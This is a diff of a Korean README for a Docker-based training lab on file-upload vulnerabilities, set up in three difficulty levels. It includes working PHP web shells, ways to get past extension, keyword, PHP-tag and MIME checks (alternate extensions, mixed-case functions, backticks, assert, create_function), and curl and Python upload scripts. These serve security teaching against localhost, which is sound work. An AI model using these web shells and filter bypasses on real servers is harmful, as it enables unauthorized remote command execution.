@@ -45,53 +45,217 @@ Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.
 
 ## 🎓 실습 시나리오
 
-### 1단계: 웹사이트 탐색
-- `http://localhost:8080` 접속
-- 파일 업로드 폼 확인
-- 취약점 정보 확인
+이 환경은 3단계 난이도로 구성되어 있으며, 각 레벨마다 다른 보안 검증이 적용됩니다.
 
-### 2단계: 웹셸 준비
-제공된 샘플 웹셸 사용:
-```bash
-cp www/sample-webshell.php.txt www/webshell.php
+### Level 1 - 초급 (필터링 없음)
+
+**목표**: 기본적인 웹셸 업로드 및 실행
+
+1. **웹셸 준비**
+   ```bash
+   cp www/sample-webshell.php.txt webshell.php
+   ```
+
+2. **업로드**
+   - `http://localhost:8080` 접속
+   - Level 1 선택
+   - webshell.php 업로드
+
+3. **실행**
+   ```
+   http://localhost:8080/uploads/webshell.php?cmd=ls
+   http://localhost:8080/uploads/webshell.php?cmd=whoami
+   ```
+
+### Level 2 - 중급 (기본 필터링)
+
+**적용된 보안 검증**:
+- ❌ `.php` 확장자 차단 (소문자만)
+- ❌ 위험 함수 키워드 차단: `system`, `exec`, `shell_exec`, `eval`, `passthru`
+
+**우회 방법**:
+
+1. **확장자 우회 - .phtml 사용**
+   ```bash
+   # 샘플 파일 사용
+   cp www/bypass-samples/level2-phtml.phtml.txt shell.phtml
+
+   # 또는 직접 작성
+   echo '<?php echo `{$_GET["cmd"]}`; ?>' > shell.phtml
+   ```
+
+2. **확장자 우회 - .php5 사용**
+   ```bash
+   cp www/bypass-samples/level2-php5.php5.txt shell.php5
+   ```
+
+3. **함수명 우회 - 대소문자 혼용**
+   ```php
+   <?php sYsTeM($_GET['cmd']); ?>
+   ```
+
+4. **함수명 우회 - 백틱 연산자**
+   ```php
+   <?php echo `{$_GET['cmd']}`; ?>
+   ```
+
+### Level 3 - 고급 (강화된 필터링)
+
+**적용된 보안 검증**:
+- ❌ 파일 크기 10KB 제한
+- ❌ `.php`, `.php3`, `.php4`, `.phar` 확장자 차단
+- ❌ MIME 타입 검증 (이미지/PDF/텍스트만)
+- ❌ `<?php` 태그 검증
+- ❌ 더 많은 위험 함수 차단 (대소문자 모두)
+
+**우회 방법**:
+
+1. **기본 우회 파일 준비**
+   ```bash
+   cp www/bypass-samples/level3-short-tag.phtml.txt shell.phtml
+   ```
+
+2. **MIME 타입 조작이 필요**
+
+   **방법 1: Burp Suite 사용**
+   - Burp Proxy 실행 및 브라우저 프록시 설정
+   - 파일 업로드 시 요청 가로채기
+   - `Content-Type: application/octet-stream`을
+     `Content-Type: image/png` 또는 `text/plain`으로 변경
+   - Forward
+
+   **방법 2: curl 명령**
+   ```bash
+   curl -X POST \
+     -F "level=3" \
+     -F "file=@shell.phtml;type=image/png" \
+     http://localhost:8080/upload.php
+   ```
+
+   **방법 3: Python 스크립트**
+   ```python
+   import requests
+
+   files = {
+       'file': ('shell.phtml', open('shell.phtml', 'rb'), 'image/png')
+   }
+   data = {'level': '3'}
+
+   response = requests.post('http://localhost:8080/upload.php',
+                           files=files, data=data)
+   print(response.text)
+   ```
+
+3. **업로드 성공 후 실행**
+   ```
+   http://localhost:8080/uploads/shell.phtml?cmd=ls
+   ```
+
+## 🔓 레벨별 취약점 및 우회 기법
+
+### Level 1 - 초급
+**취약점**:
+- 모든 파일 확장자 허용
+- 파일 내용 검증 없음
+- 어떤 PHP 파일도 업로드 및 실행 가능
+
+**학습 목표**:
+- 기본적인 웹셸 개념 이해
+- 파일 업로드 공격의 기초 학습
+
+### Level 2 - 중급
+**적용된 검증 (취약)**:
+1. `.php` 확장자만 차단 (소문자)
+2. `system`, `exec`, `shell_exec`, `eval`, `passthru` 키워드 차단
+
+**취약점**:
+- ✅ `.phtml`, `.php5`, `.php3` 등 다른 PHP 확장자 허용
+- ✅ 대소문자 구분으로 `sYsTeM` 등 우회 가능
+- ✅ 백틱(`) 연산자는 차단하지 않음
+- ✅ `pcntl_exec`, `proc_open` 등 다른 함수 미차단
+
+**우회 기법**:
+1. 확장자 변경: `.php` → `.phtml`, `.php5`
+2. 대소문자 혼용: `system` → `sYsTeM`
+3. 백틱 사용: `` `whoami` ``
+4. 다른 함수 사용: `pcntl_exec()`, `proc_open()`
+
+### Level 3 - 고급
+**적용된 검증 (취약)**:
+1. `.php`, `.php3`, `.php4`, `.phar` 확장자 차단
+2. MIME 타입 검증 (이미지/PDF/텍스트만)
+3. `<?php` 태그 검증
+4. 더 많은 위험 함수 차단 (대소문자 모두)
+5. 파일 크기 10KB 제한
+
+**취약점**:
+- ✅ `.phtml`, `.php5` 등은 여전히 허용
+- ✅ 짧은 PHP 태그 `<?` 는 미차단
+- ✅ MIME 타입은 클라이언트에서 조작 가능
+- ✅ 백틱 연산자 미차단
+- ✅ `pcntl_exec`, `assert` 등 일부 함수 미차단
+
+**우회 기법**:
+1. `.phtml` 또는 `.php5` 확장자 사용
+2. 짧은 PHP 태그 `<?` 사용
+3. MIME 타입 조작 (Burp Suite, curl, Python)
+4. 백틱 연산자로 명령 실행
+5. 파일 크기를 10KB 이하로 유지
+
+## 🛠️ 추가 우회 기법 모음
+
+### 1. 확장자 우회
+```
+.phtml   - PHP HTML
+.php5    - PHP 5.x
+.php3    - PHP 3.x
+.php4    - PHP 4.x
+.inc     - Include 파일 (설정에 따라)
+.phps    - PHP Source (설정에 따라)
 ```
 
-또는 직접 간단한 웹셸 작성:
+### 2. 함수 실행 우회
 ```php
-<?php system($_GET['cmd']); ?>
+// 백틱 연산자
+echo `whoami`;
+
+// 대소문자 혼용
+sYsTeM('ls');
+
+// 문자열 연결
+$a = 'sys'; $b = 'tem';
+$func = $a.$b;
+$func('ls');
+
+// 변수 함수
+$f = 'system';
+$f('ls');
+
+// assert (PHP < 7.2)
+assert($_GET['cmd']);
+
+// create_function (PHP < 7.2)
+$f = create_function('', $_GET['cmd']);
+$f();
 ```
 
-### 3단계: 웹셸 업로드
-1. 웹사이트의 파일 업로드 폼 사용
-2. 준비한 웹셸 파일(.php) 업로드
-3. 업로드 성공 메시지 확인
-
-### 4단계: 웹셸 실행
-업로드한 파일에 접근:
-```
-http://localhost:8080/uploads/webshell.php?cmd=ls
-http://localhost:8080/uploads/webshell.php?cmd=pwd
-http://localhost:8080/uploads/webshell.php?cmd=whoami
+### 3. PHP 태그 우회
+```php
+<?php ... ?>   // 표준 태그
+<? ... ?>      // 짧은 태그
+<?= ... ?>     // 출력 태그 (짧은 태그)
+<% ... %>      // ASP 스타일 (asp_tags 설정 필요)
 ```
 
-## 🔓 주요 취약점
+### 4. MIME 타입 조작
+```bash
+# Burp Suite: Content-Type 변경
+# curl 사용
+curl -F "file=@shell.php;type=image/png"
 
-이 실습 환경에는 다음과 같은 의도적인 취약점이 포함되어 있습니다:
-
-1. **파일 확장자 검증 없음**
-   - 어떤 확장자의 파일도 업로드 가능
-   - .php, .phtml 등 실행 가능한 파일 업로드 가능
-
-2. **파일 내용 검증 없음**
-   - 파일 내용에 대한 검사 없음
-   - 악성 코드 포함 여부 확인 안 함
-
-3. **업로드 디렉토리에서 PHP 실행 허용**
-   - uploads/ 디렉토리에서 PHP 코드 실행 가능
-   - 일반적으로는 실행 권한을 제거해야 함
-
-4. **파일명 필터링 없음**
-   - 특수문자, 경로 조작 시도 차단 안 함
+# Python requests
+files = {'file': ('shell.php', open('shell.php', 'rb'), 'image/png')}
+```
 
 ## 🛡️ 보안 대책 (학습용)
 
